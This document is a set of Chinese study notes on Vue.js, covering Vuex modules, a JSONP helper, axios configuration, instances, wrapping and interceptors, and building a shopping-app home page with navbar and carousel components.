// 其实还可以这么写  利用对象的解构 将context中的属性解构出来 我们从context中取出了三个属性
aUpdateName({state, commit, rootState}) { ... }
```

```js 
// 注意 模块中的actions中的方法中的context 指向的不是store实例对象中的mutations 而是自己模块中的mutations

const moduleA = {
state: {
  name:'erin',
},
mutations: {
  updateName(state, payload) {
    state.name = payload;
  }
},

// 使用context.commit('') 提交到modules中的mutations里 updateName 我们异步修改下 模块中的变量 name
actions: {
  aUpdateName(context) {
    setTimeout(() => {
      context.commit('updateName', 'liuliuliu')
    }, 1000)
  }
}
}


// 组件中
<button @click='asyncUpdateName'>异步修改名字</button>

asyncUpdateName() {

  // 这里也是直接使用 $store.dispatch('到模块中的actions中的方法')
  this.$store.dispatch('aUpdateName');
}
```

<br><br>

# vuex-store的文件夹的目录组织
store文件夹是作为vue相关状态管理的文件夹
```
  | - store
    - index.js        // 我们组装模块并导出store的地方
    - actions.js      // 根级别的 actions
    - mutations.js    // 根级别的 mutations

    | - modules
      - cart.js       // 购物车模块
      - products.js   // 产品模块
```

我们上面 vuex 相关的代码都是写在index.js文件里面, 但是随着项目代码不断的增多, 这个文件中的代码太多就变的越发的不容易管理

vue建议我们对index.js中的文件代码做抽离

```js 
  // index.js文件中

  const state = {
    
    这里放状态变量

  }


  const store = new Vuex.Store({
    // 也就是说将代码抽离到实例的外面
    state,

    // 不建议抽离在index.js文件中 而是将到抽离到别的js文件 利用导出和导入关联起来
    mutations,

    ...

    // 这个的抽离建议创建一个文件夹
    modules       
  })
```

<br><br>

# Vuex computed

dispatch -> actions -> mutations -> stroe 页面调用 dispatch 经过 actions store里面才会有数据

而 计算属性 和 生命周期的执行顺序是

  created
  computed
  mounted

我忘记你在哪个组件 哪个生命周期里 dispatch 的了
但是你要确保在 created 里面调用 dispatch 这样 store 里面才会有数据 computed 才能读到

```js
// vuex
import Vue from 'vue'
import Vuex from 'vuex'
import {request} from "../api";

Vue.use(Vuex)

const graph = {
  namespaced: true,
  state: {
    list: []
  },
  actions: {
    async getList({commit}) {
      let res = await request({
        url: "/"
      })
      console.log("actions")
      commit("saveList", res)
    }
  },
  mutations: {
    saveList(state, data) {
      state.list = data.data
    }
  }
}

export default new Vuex.Store({
  modules: {
    graph
  }
})


// 页面
import {mapGetters} from "vuex"
export default {
  data() {
    return {list: []}
  },
  created() {
    console.log("created")
    // this.showData()
  },
  mounted() {
    console.log("mounted")
  },
  computed: {
    show() {
      console.log("computed")
      // console.log("computed", this.$store.state.graph.list)
      return this.$store.state.graph.list
    }
  },
  methods: {
    showData() {
      this.$store.dispatch("graph/getList")
    }
  }
}
```

<br><br>

# axios
程序开发中离不开请求, 即使我们选择了第三方框架 我们也对这个第三方框架进行封装, 然后使用我们自己封装好的模块进行网络请求  
我们不会直接使用第三方框架, 因为有一天它可能不维护了 或者 出现了严重的bug

<br>

### **选择什么网络模块?**
传统的ajax是基于XMLHttpRequest 为什么不用它?
- 配置和调用方式非常混乱
- 编码起来看起来非常的蛋疼
- 真是开发中是使用jQ-ajax

<br>

jQ-ajax 为什么不用它?
- 相对于传统的ajax非常好用
- 但是在Vue的整个开发中都是不需要使用jQ了
- jQ是一个重量级的框架, 没必要为了使用jQ的ajax就引用一个如此大的框架


vue 1.x版本的时候 官方退出了vue-resource 为什么不选择它?
在vue2.0推出后, vue作者就在github的issues中说了去掉vue-resource并且以后不会更新

<br>

总结: 之后我们会对axios来进行封装并做深入的了解

<br>

### **jsonp 的封装:**
在前端开发中 我们一种常见的网络请求方式就是jsonp, 使用jsonp最主要的原因是为了解决跨域访问的问题

**jsonp的原理:**  
jsonp的核心在于通过``<script>``标签的src来帮助我们请求数据 原因是我们的项目部署在domain1.com服务器上时, 是不能直接访问domain2.com服务器上的资料的  
这个时候我们利用``<script>``标签的src帮助我们去服务器请求到数据, 将数据当做一个js的函数来执行, 并且执行的过程中传入我们需要的json

所以 封装jsonp的核心就在于我们监听window上的jsonp进行回调时的名称

<br>

### **封装 jsonp:**
```js 
let count = 1;

export default function originPJSONP(option) {
  // 1 从传入的option中提取url
  const url = option.url;

  // 2 在body中添加script标签
  const body = document.getElementsByTagName('body')[0];
  const script = document.createElement('script');

  // 3 内部生产一个不重复的callback
  const callback = 'jsonp' + count++

  // 4 监听window上的jsonp的调用
  return new Promise((resolve, reject) => {
    try {
      window[callback] = function(result) {
        body.removeChild(script)
        resolve(result)
      }
      const params = handleParam(option.data);
      script.src = url + '?callback=' + callback + params;
      body.appendChild(script)
    } catch (err) {
      body.removeChild(script)
      reject(err)
    }
  })
}

function handleParam(data) {
  let url = ''
  for(let key in data) {
    let value = data[key] !== undefined ? data[key] :''
    url += `&${key}=${encodeURIComponent(value)}`
  }
  return url
}
```

<br>

### **axios (ajax i/o system ? )**
**功能特点:** 
- 在浏览器中发送 XMLHttpRequests 请求
- 在node.js中发送http请求 node是一个环境 比如jQ就不能在node中使用 但是axios就可以
- 支持 promise api
- 拦截请求和响应
- 转换请求和响应数据


<br><br>

# axios 框架的基本使用
这个框架支持多种请求方式
axios(config)             通用
axios.request(config)
axios.get(url[, config])
axios.delete(url[, config])
axios.head(url[, config])
axios.post(url[, data[, config]])
axios.put(url[, data[, config]])
axios.patch(url[, data[, config]])

<br>

### **axios的使用**
httpbin.org 用于模拟网络请求的网站
```js 
// 老师搭建的服务器
http://123.207.32.32:8000/home/multidata
http://123.207.32.32:8000/home/data?type=sell@page=1
http://123.207.32.32:8000/home/data
```

如果不指定请求方式, 默认的情况下就是 GET 请求

<br>

**安装 axios 框架:**
```
npm i axios --save

视频里是0.18.0
```

<br>

在哪个文件里发送axios请求都可以 视频里是在main.js文件中

**在文件中引入:**  
```
import axios from 'axios';
```

**在文件中使用:**  
```
axios({ ... })
```

<br>

```js 
// axios 最简单的使用过程
axios({
  url:'http://123.207.32.32:8000/home/multidata',
  // 请求方式
  method: '',

  // 参数
  // 或者在url属性的后面拼接 http://123.207.32.32:8000/home/data?type=sell&page=1
  params: {
    type: 'pop',
    page: 1
  },


// 成功的结果通过 then 方法取得
}).then(res => {
  console.log(res);
})

// axios支持promise 所以不用像jQ那样 在{config}中写 success: function  而是直接axios().then()  axios会返回一个promise 内部会执行resolve 所以我们可以使用then
```

<br>

### **发送get请求的演示**
下面的代码抄写的屏幕
```js 
// 引入 axios
import axios from 'axios';

export default {
  name: 'app',

  // 为什么这里没有跨域的问题?
  // 1. 没有请求参数
  axios.get('http://123.207.32.32:8000/category')
    .then(res => {
      console.log(res)
    }).catch(err => {
      console.log(err)
    })

  // 2. 有请求参数
  axios.get('http://123.207.32.32:8000/home/data', {params:{type:'sell', page: 1}})
    .then(res => {
      console.log(res)
    }).catch(err => {
      console.log(err)
    })
}
```

<br><br>

# axios 发送并发请求
axios提供如果想发送多个并发请求, 想让这两个请求都成功之后再做响应处理的话, axios提供了api

### **axios.all()**
参数: 传递一个promise数组 axios.all([请求1, 请求2]).then(成功的结果)  
then() 中会拿到多个请求的结果 当多个请求都成功的时候会到then()方法里面 results(请求成功返回的数据) 是一个数组[{}, {}]

```js 
axios.all([
  // 请求1
  axios({
    url:'http://123.207.32.32:8000/home/multidata'
  }),

  // 请求2
  axios({
    url:'http://123.207.32.32:8000/home/data',
    params: {
      type: 'sell',
      page: 5
    }
  })

// 成功的部分
]).then(results => {

  // 这里会拿到多个请求的结果 当多个请求都成功的时候会到then()方法里面 results 是一个数组[{}, {}]
  console.log(results)
  console.log(results[0])
  console.log(results[1])
})
```

<br>

### **then(axios.spread((请求结果1, 请求结果2, ...) => { ... }))**
上面我们是通过result[0] 通过下标的方式去读请求回来的数据的结果 axios直接给我们提供了直接获取请求结果的api
```js 
axios.all([
  axios({
    url:'http://123.207.32.32:8000/home/multidata'
  }),
  axios({
    url:'http://123.207.32.32:8000/home/data',
    params: {
      type: 'sell',
      page: 5
    }
  })
]).then(axios.spread((res1, res2) => {

  // 直接获取的数据 不用通过下标的方式
  console.log(res1);
  console.log(res2);
}))
```

<br><br>

# axios 的配置信息相关
在上面的示例中, 我们的baseURL都是固定的, 事实上, 在开发中可能很多参数都是固定的, 这个时候我们可以进行一些抽取 也可以利用axios的全局配置
```
  baseURL: 123.207.32.32:8000
```

- 比如固定的请求头的信息:  
Content-Type : application/x-www-form-urlencoded

- 比如超时时间, 5秒没有响应就超时了 等等  

这样如果有请多的请求, 那么每个请求中都有 baseURL timeout header 等代码就重复了 这时我们就可以进行全局配置

<br>

### **axios.defaults 配置axios的全局属性:**
我们可以将所有请求的公共部分, 放在 axios.default 中, 给它添加属性就是配置全局属性, 写在哪都可以

```js 
axios.defaults.baseURL = '123.207.32.32:8000'
axios.defaults.headers.post['Content-Type'] = 'application/x-www-form-urlencoded'
axios.defaults.timeout = 5;   // 单位是毫秒 5000是 5秒
```

```js 
axios.defaults.baseURL = 'http://123.207.32.32:8000';
axios.defaults.timeout = 5;

axios.all([
  axios({
    // 因为我们配置了 baseURL 所以这里我们直接写接口
    url:'/home/multidata'
  }),
  axios({
    url:'/home/data',
    params: {
      type: 'sell',
      page: 5
    }
  })
]).then(axios.spread((res1, res2) => {
  console.log(res1);
  console.log(res2);
}))
```

<br>

### **常见的配置选项:**
- url: '/user'  
请求地址

- method: 'GET'  
请求类型

- baseURL: 'http://www.mt.com'  
请根路径

- transformRequest:[function(data){}]  
请求前的数据处理

- transformResponse:[function(data){}]  
请求后的数据处理

- headers: {'x-Requested-With' : 'XMLHttpRequest'}  
自定义请求头

- params: {id:12}  
URL查询对象


- paramsSerializer: function(params) {}  
查询对象序列化函数

- data: {key:'aa'}      
请求体 request body

- timeout: 1000  
超时设置s

- withCredentials: false  
跨域是否带Token

- adapter: function(resolve, reject, config) { }  
自定义请求处理

- auth: {uname: '', pwd: '12'}  
身份验证信息

- responseType: 'json'  
响应的数据格式 json / blob / document / arraybuffer / text / stream

<br>

### 要点:
```
method: "GET"
params: { id: 1 }

method: "POST"
data: { key: ''}
```

当提交请求的方式是get的时候  提交参数要用params  
当提交请求的方式是post的时候 提交参数要用data


<br><br>

# axios 的实例
上面我们了解了 axios.defaults 的方式给axios发送请求的时候配置全局的公共部分

为什么要创建axios的实例呢?  
当我们从axios模块中导入对象时, 使用的实例是默认的实例 当给该实例设置一些默认配置时, 这些配置就被固定下来了 但是后续开发中, 某些配置可能会不太一样

比如某些请求需要使用特定的baseURL或者timeout或者content-type等 但是有些情况会有 baseURL 不一样, timeout 也不一样的情况

这个时候, 我们就可以创建新的实例, 并且传入属于该实例的配置信息

<br>

### **插个服务器的概念:**
服务器有一个概念叫做分步式, 服务器在部署的时候, 当它的并发量(同时请求的数量)特别的高的情况下, 服务器可能就不能满足整个的业务需求, 同时有很多用户向服务器发送请求的时候, 服务器可能会处理不过来

当业务量特别的大的时候, 我们会搞很多个服务器, 那么这三个服务器的ip地址就会不一样
```
  服务器A   首页请求的服务器
  服务器B   类型请求的服务器
  服务器C   其它的东西的服务器
```

```
  客户端A                       服务器A

  客户端B     反向代理服务器      服务器B
              nginx部署
  客户端C                       服务器C

  客户端不管有多少客户面对的都是一个反向代理服务器
  nginx会根据哪一个服务器目前请求量不是很多, 来判断去哪一个服务器请求数据
```


假设 我们首页数据 我们要向 服务器A请求, 分类要向服务器B请求... 那么客户端就会有不同的ip地址 事实上不多, 事实上是上面我们了解的反向代理服务器的概念

这个时候我们使用 axios.defaults 设置全局的baseURL就不合适了 
所以一般我们使用axios发送请求的时候 不会直接使用全局配置来进行网络请求, 而是先创建axios的实例

<br>

### **axios的真正的使用方式**
前置步骤: 下载 和 引入

**创建 axios 实例  通过 axios.create() 创建:**  
```js 
const instance1 = axios.create({ 
  
  实例中配置 公共的配置
  比如
    baseURL
    timeout
    请求头信息等

});
```

**通过 intance1({ ... }) 代替 axios({ ... }) 创建 请求:**
```js 
之前我们发送请求都是
axios({})

现在我们是通过创建的实例发送
instance1({})
```

```js 
// 创建 axios 实例 并在实例中配置公共配置
const instance1 = axios.create({
  baseURL: 'http://123.207.32.32:8000',
  timeout: 5000
});

// 使用实例对象 发送请求
instance1({
  url:'/home/multidata'
}).then(res => {
  console.log(res);
})


// 使用同一个实例对象 发送请求
instance1({
  url: '/home/data',
  params: {
    type: 'pop',
    page: 1
  }
}).then(res => {
  console.log(res);
})


// 创建新的实例, 在实例中填写新的 公共配置
const instance2 = axios.create({
  baseURL: 'http://222.111.32.32:5000',
  timeout: 10000,
  headers: ...
});

... 

这样的话 每一个实例都会有自己独立的配置
```

**以后在开发的过程中不要如下操作:**  
我们在组件中引入了axios模块, 然后分别在script中发送了请求, 并展示在页面上
当有多个组件并且都使用下面的方式发送请求的时候, 这样多个组件对第三方模块的依赖性太强了

问题是如果有一天axios这个框架不再维护了 那就懵逼了, 所以只有我们在进行开发的时候如有我们依赖了第三方的东西, 千万不要在每一个组件里面都对这个第三方的东西进行依赖

```js 
// 比如 我们在 app.vue 文件中要发送网络请求, 很多同学就会这样
import axios from 'axios'

<template>
  <div id='app'>

    // 将保存早data中的数据在页面中进行展示
    <div> {{result}} </div>

  </div>
</template>

export default {
  name:'App',
  data() {
    return {
      result: ''
    }
  }
  // 在组件被创建的时候发送网络请求
  created() {
    axios({
      url: 'http://123.207.32.32:8000/home/multidata'
    }).then(res=> {
      
      // 将我们取到的结果 保存在data中
      this.result = res
    })
  }
}
```

我们应该这样
```  
                  axios     →       新的框架

            对axios进行自己的封装

      ↙     ↙       ↓     ↘      ↘

组件1     组件2     组件3     组件4     组件5
```

假如我们很多组件都需要依赖于axios进行依赖发送请求, 我们应该单独的创建一个文件之后所有的组件在做网络请求的时候都是面向 我们自己封装的文件

而之后我们单独创建的文件在根据axios进行一个封装 如果有一天axios不维护了那么我只需要改 我们封装的文件就可以了

以后再遇到第三方框架的时候都要用这种逻辑来使用

<br>

### **对 axios 进行封装**
1. 在src中创建 network 文件夹 创建 request.js 文件
```js 
// 也就是说其他组件在发送网络请求的时候 面向 request.js 文件就可以了 导出这个文件的时候 使用

export function request() { ... }

// 这样以后再有别的实例 还可以继续导出
export function request1() { ... }
export function request2() { ... }
```

2. **方式1:**  
request.js中 通过回调的方式 将请求的结果 和 错误对象 回调回去

```js 
export function request(config, success, failure) {

  // 创建 axios 实例 实例中写上公共配置
  const instance = axios.create({
    baseURL: 'http://123.207.32.32:8000',
    timeout: 5000
  })

  // 别人传递进来的config要传到实例里面才能进行网络请求 所以
  instance(config)
    .then(res => {

      // 通过success函数 将成功的结果回调出去
      success(res);
    })
    .catch(err => {

      // 通过failure函数 将失败的结果回调出去
      failure(err);
    })
}


// 组件中在使用的时候
request({
  url: 'home/multidata'

  // success回调函数
}, res => {
  // 这里可以打印 或者将结果保存在组件的data中
  console.log(res);

  // failure回调函数
}, err => {

  // 这里就是请求失败的错误对象err是axios回调出来的
  console.log(err)
})
```

2. **方式2:**  
调用者在传递参数的时候, 参数内部必须有 baseConfig, success, failure
相当于 组件在使用的时候 request({}) 中的{}就是config
```js 
config对象里面有
{
  baseConfig: {
    配置
  },
  success: function() { ... }
  failure: function() { ... }
}
```

```js 
export function request(config) {

  // 创建实例
  const instance = axios.create({
    url: 'http://123.207.32.32:8000',
    timeout: 5000
  })

  instance(config.baseConfig)
    .then(res => {
      config.success(res);
    })
    .catch(err => {
      config.failure(err);
    })
}


// 组件中在使用的时候
request({
  baseConfig: {
    url:'/home/data'
  },
  success: function(res) {
    console.log(res)
  },
  failure: function(err) {
    console.log(err)
  }
})
```

<br>

### **最终方案过渡 promise**
使用promise
```js 
// request.js

export function request(config) {
  return new Promise((resolve, reject) => {
    // 网络请求都是异步操作 我们把它放到这里
      const instance = axios.create({
        baseURL: 'http://123.207.32.32:8000',
        timeout: 5000
      })

      instance(config)
      .then(res => {
        resolve(res)
      })
      .catch(err => {
        reject(err)
      })
  })
}


// 组件中调用
request({
  url: '/home/data'
}).then(res => {
  console.log(res)
}).catch(err => {
  console.log(err)
})
```

<br>

### **最终方案:**
axios 通过 axios.create() 创建的对象本身就是promise对象 所以没有return new Promise
```js 
export function request(config) {
  // 网络请求都是异步操作 我们把它放到这里
  const instance = axios.create({
    baseURL: 'http://123.207.32.32:8000',
    timeout: 5000
  })

  // 这个实例本身返回的就是promise 所以组件中可以通过then catch拿到结果
  return instance(config)
}


// 组件中调用
request({
  url: '/home/data'
}).then(res => {
  console.log(res)
}).catch(err => {
  console.log(err)
})
```

<br><br>

# axios 拦截器的使用
### **待整理**
https://www.jianshu.com/p/489c4d34f352

在发送网络请求之前希望对某些请求做一些拦截, 比如拼接上一些东西或者查看是否携带了一些东西 在发送网络请求之前增加动画啦

axios提交了拦截器, 用于我们在发送每次请求或者得到响应后, 进行对应的处理
```js 
// 请求成功 和 请求失败 的拦截
instance.interceptors.request.use(config => {
  console.log('来到了request拦截success中')
  return config
}, err => {
  console.log('来到了request拦截failure中')
  return err
})


// 响应成功 和 响应失败 的拦截
instance.interceptors.response.use(response => {
    console.log('来熬了response拦截success中')
    return response.data
  }. err => {
    console.log('来到了response拦截failure中')
    return err
  })
```

<br>

### **axios.interceptors.request  -- 拦截全局axios的请求(成功和失败)**
### **axios.interceptors.response -- 拦截全局axios的响应(成功和失败)**
上面都是拦截的全局axios 还可以拦截axios创建的实例
```js 
const instance = axios.create({

  // 还可以拦截实例
  instance.interceptors.request
  instance.interceptors.response
})
```

<br>

### **实例 / 全局.interceptors.request.use() **
### **实例 / 全局.interceptors.response.use() **
**参数:**  
是两个函数, 一个请求 / 响应 成功的函数 一个请求 / 响应 失败的函数  
请求拦截中的参数是 config 拦截的是请求体(配置信息 比如 url method等)  
响应拦截中的参数是 res 拦截的是响应体(status data headers request等)
```js 
export function request(config) {
  const instance = axios.create({
    baseURL: 'http://123.207.32.32:8000',
    timeout: 5000
  })

  // 使用拦截器拦截实例, 请求拦截
  instance.interceptors.request.use(config => {

    // 拦截的是axios发送请求的配置
    console.log(config)
    // 拦截到的config的return出去 要不内部的config外部拿不到

    // 一般请求拦截会在这里处理什么逻辑
    // 1. 比如config中的信息不符合服务器的要求 比如会config中的东西进行某种变化后再返回回去

    // 2. 比如每次发送网络请求时, 都希望在界面中显示一个请求的图标(请求时的加载动画), 每次在发送请求的时候将动画show出来, 然后响应数据的时候 再去响应拦截里面隐藏起来

    // 3. 某些网络请求(比如登录 token), 必须携带一些特殊的信息 

    return config

  }, err => {

    // 发送都没发送出去, 比如网络断掉了
    console.log(err)
  })


  // 使用拦截器进行响应的拦截
  instance.interceptors.response.use(res => {
    console.log(res)
    // res中里面有data, 我们真正有用的就是data 我们会从res中取出data
    
    // 在这里一样 我们做完处理完拦截响应的逻辑后 要将res.data返回出去 要不组件中得不到结果 返回data就可以
    return res.data

  }, err => {
    console.log(err)
  })

  // 发送真正的网络请求
  return instance(config)
}
```

<br>

### **请求拦截的作用**
一般请求拦截中会处理什么逻辑
1. 比如config中的信息不符合服务器的要求 比如会config中的东西进行某种变化后再返回回去

2. 比如每次发送网络请求时, 都希望在界面中显示一个请求的图标(请求时的加载动画), 每次在发送请求的时候将动画show出来, 然后响应数据的时候 再去响应拦截里面隐藏起来

3. 某些网络请求(比如登录 token), 必须携带一些特殊的信息 

<br><br>

# 项目开发 - 划分目录结构
当有一个新的项目时, 应该做的第一件事就是划分目录结构, 我们只需要负责 src 文件夹的结构划分就可以 一般其它的都不需要动的

```
  | - src
    | - assets        // 资源 比如图片 css 
      | - img
      | - css
        - normalize.css
        - base.css

    // 公共组件 比如这个组件既在home又在category用
    | - components  
      // 当前项目下共用的组件 甚至是下一个项目也可共用的组件  
      | - common      
      // 只跟当前项目中是共用的组件
      | - content     
    
    // 大的视图 首页之类的
    | - views         

    | - router
    | - store         // vuex
    | - network       // 网络相关的
    | - common        // 公共的js文件
      - const.js      //  当有一些公共的常量要抽取的时候放在这里
      - utils         // 工具函数 工具类
      - mixin.js      // 混入
```

<br><br>

# 项目开发 - css文件的引入
我们在放css的文件夹里面放了两个css文件base.css 和 normalize.css

我们在base.css中引入normalize.css
```js 
@import './normalize.css';
```

在App.vue文件中 引入base.css
```js 
  <style>
    @import './assets/css/base.css';
  </style>
```

<br><br>

# vue中配置webpack相关

### **configureWebpack**
vue.config.js中通过设置configureWebpack来配置webpack插件  

configureWebpack有两种形式
- 对象形式
- 函数形式

并且都对生产环境和开发环境做了判断。

<br>

### **对象形式**
```js
module.exports = {
  // 对象的形式配置configureWebpack
  configureWebpack: {
    name: 'xxx',
    resolve: {
      alias: {
        '@': path.resolve(__dirname, 'src')
      }
    },
    plugins: process.env.NODE_ENV === 'production' ? [
      // 去除console.log
      new UglifyPlugin(),
      // 代码压缩
      new CompressionPlugin()
    ] : []
  },
};
```

<br>

### **函数形式**
参数 config 就是webpack对象 我们往它的身上加东西
```js
module.exports = {
  // 函数的形式配置configureWebpack
  configureWebpack: (config) => {
    config.name = 'xxx'
    config.resolve = {
      ...config.resolve,
      alias: {
        '@': path.resolve(__dirname, 'src'),
      }
    }
    // 对生产环境的配置
    if (process.env.NODE_ENV === 'production') {
      const plugns = [
        // 去除console.log
        new UglifyPlugin(),
        // 代码压缩
        new CompressionPlugin()
      ]
      config.plugins.push(...plugns)
    }
  },
}
```

<br>

### **cli3中配置别名**
配置完别名后就不用通过../../的形式找文件了

<br>

### **项目根目录下创建 vue.config.js 文件**
```js 
// 在文件内部导出配置 这个配置会和node_module中的配置最终会进行合并
module.exports = {
  configureWebpack: {
    resolve: {
      alias: {
        // cli3中内部已经对src文件夹配置别名 @ 了
        'assets': '@/assets',
        'common': '@/common',
        'components': '@/components',
        'network': '@/network',
        'views': '@/views'
      }
    }
  }
}
```

<br>

### **.editorconfig**
在通过脚手架2搭建的项目 会自动创建一个 .editorconfig
它的目的是对我们的代码风格的问题做一个统一 比如缩进 最后一行是否换行等

一般情况下 项目里都要有这个文件
```js 
  root = true

  [*]
  charset = utf-8
  indent_style = space
  indent_size = 2
  end_of_line = 1f
  insert_final_newline = true
  trim_trailing_whitespace = true
```  

<br><br>

# 项目开发 - tabbar引入和项目模块划分
我们引入上面开发好的tarbar 将tarbar的文件夹整体的拿过来
在html中的src等使用别名的话 前面要加上 ~
```js 
  // 包括组件中的 style 标签内
  @import '~assets/css/iconfont/iconfont.css';
```

我们将这个tabbar导入到app.vue文件中

<br>

### **网页 icon 图标的修改**
我们把新的icon复制粘贴到我们自己的项目的public文件夹内就可以
```js 
  <link rel="icon" href="<%= BASE_URL %>favicon.ico">
```

<br>

### **<%= BASE_URL %>**
获取当前文件所在的路径 在当前所在的路径取找icon 这个是jsp语法 为了动态的获取文件的路径
也不用担心jsp语法会不会被html识别, 因为我们最终会进行打包 publick这个文件夹(相当于static文件夹)最终会原封不动的复制到dist里面
打包的时候会以public文件夹里的html位置作为模板来打包 并不会出现jsp的语法

<br><br>

# 项目开发 - 首页导航栏的封装的使用
我们观察到这个项目 navbar 的部分, 每个分类中的 navbar 的部分样式都不一样, 有的页只有标题 有的页还有选项卡和箭头, 所以我们也要把导航栏封装成一个独立的组件 使用slot

<br>

### **扩展:**
一般文件夹小写 文件名大写 这是一种风格
```js 
  src\components\common\navbar\NavBar.vue
```

<br>

### **NavBar.vue 中 封装 nav-bar**
我们要给整体设置下样式, 这样别人在调用的时候就可以直接使用
我们对整个组件进行些布局, 因为左右插槽需要在两侧, 剩下宽度给中间的插槽 那就势必要用到css样式

再给插槽写css样式的时候 我们要把slot套一层div 属性要写在div上, 因为插槽slot会被替换掉的

```js 
  <template>
    <div class='nav-bar'>
      <div class='left'><slot name='left'></slot></div>
      <div class='center'><slot name='center'></slot></div>
      <div class='right'><slot name='right'></slot></div>
    </div>
  </template>
```

<br>

### **NavBar.vue的使用**
我们看看封装好的组件会在各个页面中使用, 下面我们说下在 home.vue 文件中调用
```js 
  <template>
    <div id='home'>
      <nav-bar>

        // 具名插槽的时候 要使用<template #插槽的名字>
        <template #center>
          <span>购物车</span>
        </template>

      </nav-bar>
    </div>
  </template>
```

home.vue文件中设置nav-bar的背景颜色  
我们不能在NavBar.vue文件中设置导航条的背景颜色, 因为在这里设置后组件被调用的时候就会是默认色了 所以这里我们给 <组件> 上设置一个class 通过class给组件设置背景色
```js 
<template>
  <div id='home'>

    // 这里我们给 <nav-bar class='home-nav'> 设置了class 
    <nav-bar class='home-nav'>
      <template #center>
        <span>购物车</span>
      </template>
    </nav-bar>

  </div>
</template>


<style scoped>
  .home-nav {
    background:var(--color-tint);
    color:#fff;
  }
</style>
```

<br>

### **调试**
1. 先利用f12中的vue 看看组件有没有被添加进来
2. 在去elements看看结构

<br><br>

# 首页开发 - 请求首页的多个数据
首页的导航栏我们已经封装完了, 接下来该下面的一个结构, 该轮播图了  
但是在做轮播图之前, 我们要先把轮播图的数据先请求过来, 因为即使把轮播图做好 没有数据也办法进行展示

实际开发中的逻辑  
应该先获取数据 然后再根据数据进行展示比较好, 也有种情况是公司服务器还没有开发完呢 可能还没有数据 这时候只能按照模拟的数据先把东西做好

正常的逻辑就是 我们都是从服务器拿到数据 然后根据数据来创建对应标签


1. 在network文件夹中创建 关于请求相关的request.js文件
```
安装 axios  npm i axios --save
```
这里我们还是需要拦截器的 因为要对请求回来的data做一步转化来返回出去 

request.js
```js
import axios from 'axios'

export function request(config) {
  // 1.创建axios的实例
  const instance = axios.create({
    baseURL: 'http://123.207.32.32:8000',
    timeout: 5000
  })

  // 请求拦截
  instance.interceptors.request.use(config => {
    return config
  }, err => {
    // console.log(err);
  })

  // 响应拦截
  instance.interceptors.response.use(res => {
    return res.data
  }, err => {
    console.log(err);
  })

  // 3.发送真正的网络请求
  return instance(config)
}

```

2. 创建 组件.js 文件 将组件中关于网络请求的事情 都在这个js文件操作  
上面封装好了 网络请求后 我们要开发发送网络请求了, 接下来我们home页要发送请求

request.js文件是我们自己封装的, 我们所有的组件都是面向request.js发送请求, 这样不用担心换框架的问题

但是 实际开发中 不会在 home.vue 文件中 调用request() 发送请求 而是在network文件夹中 创建 home.js 文件

network 文件夹中 文件的结构
这样关于home页的请求 都在home.js文件中
```
  | - network
    - request.js
    - home.js     跟首页相关的网络请求
```

home.js 文件:  
这样封装的优点, 因为首页不仅仅是一个请求可能有多个请求 如果在home.vue文件中使用request.js是请求数据

当请求的地方很多的话, 请求的代码就会和组件内部的逻辑代码混合在一起 不方便管理 我们可以将所有关于首页的请求, 都封装在这个js文件中 做一个统一的管理 比如以后我要改哪个请求的url 直接在这个文件里修改就可以了

```js 
import {request} from './request'

// 获取首页的多个数据
export function getHomeMultidata() {

  // 将请求的数据直接return出去
  return request({
    url:'/home/multidata'
  })
}
```

home.vue 文件:  
我们要在首页中发送网络请求, 那什么时候发送网络请求呢? 
组件一旦创建好的时候发送网络请求 请求数据用于展示  所以我们要使用生命周期函数

```js
created() {

  在这里使用我们封装的home.js文件中额方法 发送请求

}
```

```js 
created() {

  // 这个函数内部返回的是 promise 所以我们可以通过then()方法 获取响应回来的数据
  getHomeMultidata().then(res => {

    // res 就是我们请求回来的数据

  })
}
```

<br>

### **要点:**
1. 因为函数的关系(函数调用完毕后内部的变量就会被销毁), 我们要将获取到的数据保存在组件的data中

```js 
  data() {
    result: null
  },

  created() {
    getHomeMultidata().then(res => {
      this.result = res
    })
  }
```

**原因:**  
函数调用完毕后内部的变量就会被销毁 res = { }   
res是函数中的变量, 当函数调用完毕后 变量 res 就会被销毁 那就说明没有指针指向{}, 那么{}因为没有指针指向它最终会被垃圾回收掉

this.result = res 引用类型的赋值 给result的是地址值, 说明即使res在函数调用后会被销毁但是{}还有result指向 所以{}不会被垃圾回收


2. 获取能直接使用的数据  
上面的 then(res => { }) res是整体的数据, 里面包含了很多部分的数据 为了方便使用 我们要将res中的数据 分别提取出来, 方便使用
```js 
this.banners = res.data.banner.list
this.recommends = res.data.recommend.list
```

3. 注意异步同步的问题  
```js 
created() {
  getHomeMultidata().then(res => {
    this.result = res

    // 在这里验证result可能获取不到 因为这个console是同步, 整个获取数据的过程是异步 所以console会在获取数据之前被打印
    console.log(result)
  })
}
```


### **完整代码**
```js 
data() {
  return {
    banners: [],
    recommends:[]
  }
},
created() {
    this.banners = res.data.banner.list
    this.recommends = res.data.recommend.list
  })
}
```

<br><br>

# 首页开发 - 轮播图的展示
上面的章节 我们已经从服务器上获取到了数据 接下来我们要将数据展示到页面上  
我们需要封装一个组件, 然后进行展示
```js 
// 轮播图老师没有做而是将他自己做好的组件 复制到了我们的项目
// 老师创建了两个组件 将两个组件放在了一个index.js文件导出 方便统一导出了统一引入

import Swiper from './Swiper'
import SwiperItem from './SwiperItem'

export {
  Swiper, SwiperItem
}

// 这样写的好处是 正常我们要是在组件中使用这个轮播图 我们需要引入两个组件
import Swiper from ''
import SwiperItem from ''

// 但是如果是通过整合到一起的 index.js 的话 写一次就好了
import { Swiper, SwiperItem } from ''
```

上面那节 我们将从服务器请求过来的数据 存到了data中的变量里
```js 
banner:[{}, {}, {}, {}]

每一个{}都是关于图片的信息, 每一个对象中有
image: '图片地址'
link: '点击图片跳转到哪里的地址'
title: '这张图片的title'
```

<br>

### **老师封装的轮播图的组件的使用**
没事可以自己看看老师是怎么写的 将组件在 home.vue 文件中调用
```js 
<swiper>
  <swiper-item 
    v-for='(item,index) of banners' 
    :key='index'
  >
    <a :href="item.link">
      <img :src="item.image">
    </a>
  </swiper-item>
</swiper>
```

<br>

### **要点:**
1. 我们从服务器请求过来的数据, 要根据请求回来的数据, 动态生成结构, 所以我们使用 v-for(哪个结构要重复就在哪个结构上使用v-for)
  
2. 给属性动态的绑定值的时候 我们使用 v-bind 只要是组件data里面的属性都能获取到

<br>

### **swiper部分的抽取**
每一个页面的组件 主要负责将所有的组件 集成在一起, 不然所有的内容都在home.vue中 这个页面的代码量会越来越多不方便管理

所以我们将swiper的部分也拿出来, 我们在每一个页面的文件夹内 再创建一个子组件文件夹
```
  | - views
    | - home
